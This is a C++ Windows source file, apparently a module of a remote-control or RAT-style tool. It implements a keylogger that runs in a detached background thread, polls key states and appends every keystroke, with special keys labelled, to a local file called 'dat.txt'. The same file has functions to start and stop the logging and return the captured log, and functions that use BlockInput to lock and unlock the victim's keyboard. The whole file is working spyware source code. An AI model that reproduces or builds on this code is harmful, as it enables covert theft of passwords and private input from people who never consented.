#include "syscalls.h"

std::atomic<bool> keyloggerRunning = false;
const std::map<int, std::string> specialKeys = {
	{VK_SPACE, "#SPACE"},
	{VK_RETURN, "#RETURN"},
	{VK_BACK, "#BACKSPACE"},
	{VK_LBUTTON, "#L_CLICK"},
	{VK_RBUTTON, "#R_CLICK"},
	{VK_CAPITAL, "#CAPS_LOCK"},
	{VK_TAB, "#TAB"},
	{VK_UP, "#UP_ARROW_KEY"},
	{VK_DOWN, "#DOWN_ARROW_KEY"},
	{VK_LEFT, "#LEFT_ARROW_KEY"},
	{VK_RIGHT, "#RIGHT_ARROW_KEY"},
	{VK_CONTROL, "#CONTROL"},
	{VK_MENU, "#ALT"},
	{VK_ESCAPE, "#ESCAPE"},
	{VK_END, "#END"},
	{VK_HOME, "#HOME"},
	{VK_INSERT, "#INSERT"},
	{VK_DELETE, "#DELETE"},
	{VK_SHIFT, "#SHIFT"},
	{VK_LSHIFT, "#LEFT_SHIFT"},
	{VK_RSHIFT, "#RIGHT_SHIFT"},
	{VK_LCONTROL, "#LEFT_CONTROL"},
	{VK_RCONTROL, "#RIGHT_CONTROL"},
	{VK_LMENU, "#LEFT_ALT"},
	{VK_RMENU, "#RIGHT_ALT"},
	{VK_LWIN, "#LEFT_WINDOWS"},
	{VK_RWIN, "#RIGHT_WINDOWS"},
	{VK_SNAPSHOT, "#PRINT_SCREEN"},
	{VK_SCROLL, "#SCROLL_LOCK"},
	{VK_PAUSE, "#PAUSE"},
	{VK_F1, "#F1"},
	{VK_F2, "#F2"},
	{VK_F3, "#F3"},
	{VK_F4, "#F4"},
	{VK_F5, "#F5"},
	{VK_F6, "#F6"},
	{VK_F7, "#F7"},
	{VK_F8, "#F8"},
	{VK_F9, "#F9"},
	{VK_F10, "#F10"},
	{VK_F11, "#F11"},
	{VK_F12, "#F12"},
	{VK_NUMLOCK, "#NUM_LOCK"},
	{VK_MULTIPLY, "#NUMPAD_MULTIPLY"},
	{VK_ADD, "#NUMPAD_ADD"},
	{VK_SUBTRACT, "#NUMPAD_SUBTRACT"},
	{VK_DECIMAL, "#NUMPAD_DECIMAL"},
	{VK_DIVIDE, "#NUMPAD_DIVIDE"}
};

void LOG(std::string input) {
	std::fstream LogFile;
	LogFile.open("dat.txt", std::fstream::app);
	if (LogFile.is_open()) {
		LogFile << input << " ";
		LogFile.close();
	}
}

bool SpecialKeys(int S_Key) {
	int entry = specialKeys.find(S_Key) != specialKeys.end() ? S_Key : -1;
	if (entry != -1) {
		LOG(specialKeys.at(entry));
		return true;
	}
	return false;
}

static void Keylogger()
{
	unsigned char KEY;

	while (keyloggerRunning) {
		Sleep(10);
		for (KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {
					std::fstream LogFile;
					LogFile.open("dat.txt", std::fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(KEY) << " ";
						LogFile.close();
					}

				}
			}
		}
	}
}

bool startKeylogger(std::string& result) {
	if (keyloggerRunning) {
		result = "Keylogger already running";
		return false;
	}
	keyloggerRunning = true;

	remove("dat.txt");

	std::thread t(Keylogger);
	t.detach();
	result = "Keylogger started";

	return true;
}

bool stopKeylogger(std::string& result, std::ifstream& file) {
	if (!keyloggerRunning) {
		result = "Keylogger not running";
		return false;
	}

	keyloggerRunning = false;
	result = "Keylogger stopped";
	file.open("dat.txt", std::fstream::in);

	return true;
}

bool lockKeyboard(std::string& result) {
	bool res = BlockInput(true);
	if (!res) {
		// Check if the server is running as administrator
		bool elevated = isElevated();
		if (!elevated)
			result = "Failed to lock keyboard. The server is not running as administrator.";
		else
			result = "Failed to lock keyboard. Keyboard may already be locked.";
		return false;
	}
	result = "Keyboard locked";
	return true;
}

bool unlockKeyboard(std::string& result) {
	bool res = BlockInput(false);
	if (!res) {
		result = "Failed to unlock keyboard. Keyboard may already be unlocked.";
		return false;
	}
	result = "Keyboard unlocked";
	return true;
}